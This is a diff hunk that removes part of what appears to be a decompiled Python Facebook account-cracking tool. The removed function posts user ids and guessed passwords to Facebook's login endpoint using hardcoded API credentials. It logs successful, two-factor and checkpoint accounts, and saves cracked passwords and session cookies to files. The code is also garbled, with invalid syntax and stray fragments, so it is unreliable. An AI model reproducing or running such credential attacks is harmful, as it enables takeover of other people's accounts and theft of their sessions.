@@ -1208,67 +1208,6 @@ def api1(ids, names, passlist):
             '29',
             '210']
         li2 = random.choice(li)
-random.choice(digits)
-        jazoest = li2 
-        data = {
-            'api_key': '882a8490361da98702bf97a021ddc14d',
-            'access_token': '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
-            'sig': '4c854da0db9429f4913c2a1b221c1d30' }
-        headers = {
-            'X-Fb-Device-Group': '6060',
-            'X-Tigon-Is-Retry': 'False',
-            'X-Fb-Friendly-Name': 'authenticate',
-            'X-Fb-Request-Analytics-Tags': 'unknown',
-            'X-Fb-Http-Engine': 'Liger',
-            'X-Fb-Client-Ip': 'True',
-            'X-Fb-Server-Cluster': 'True',
-            'Content-Length': '2126' }
-        url = 'https://b-graph.facebook.com/auth/login'
-        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
-        po = requests.post(url, data = data, headers = headers).json()
-        if 'session_key' in po:
-            print('\r\r\x1b[1;32m [SIHAB-OK💚] ' + ids + ' | ' + pas + '')
-            get_coki = (lambda .0: for i in .0:
-           i['name'] + '=' + i['value']None)(po['session_cookies']())
-            compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
-            coki = f'''sb={compile_coki};{get_coki}'''
-            open('/sdcard/SIHAB-FILE-M1-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
-            open('/sdcard/SIHAB-FILE-M1-OK.txt', 'a').write(ids + '|' + pas + '\n')
-            oks.append(ids)
-            os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
-            ';'.join
-        if twf in str(po):
-            if not 'y' in pcp:
-                pass
-            print('\r\r\x1b[1;34m[SIHAB-2F] ' + ids + ' | ' + pas)
-            os.system('espeak -a 300 " OH SHIT FUCK ME 2F ID"')
-            twf.append(ids)
-        if 'www.facebook.com' in po['error']['message']:
-            if 'y' in pcp:
-                print('\r\r\x1b[1;31m [SIHAB-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
-                open('/sdcard/SIHAB-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
-                os.system('espeak -a 300 " OH SHIT FUCK ME CP ID"')
-                'MOBILE.LTE'
-            open('/sdcard/SIHAB-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
-            'X-Fb-Connection-Type'
-    loop += 1
-    return None
-    '24807555'
-    ln = fn
-    if requests.exceptions.ConnectionError:
-        'X-Fb-Connection-Bandwidth'
-        time.sleep(5)
-        api1(ids, names, passlist)
-        return None
-    if Exception:
-        e = 'OAuth null'
-        e = None
-        del e
-        return None
-        e = None
-        del e
-
-
 def api2(ids, names, passlist):
     global loop
     sys.stdout.write(f'''\r\r\x1b[1;37m [SIHAB-M2] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
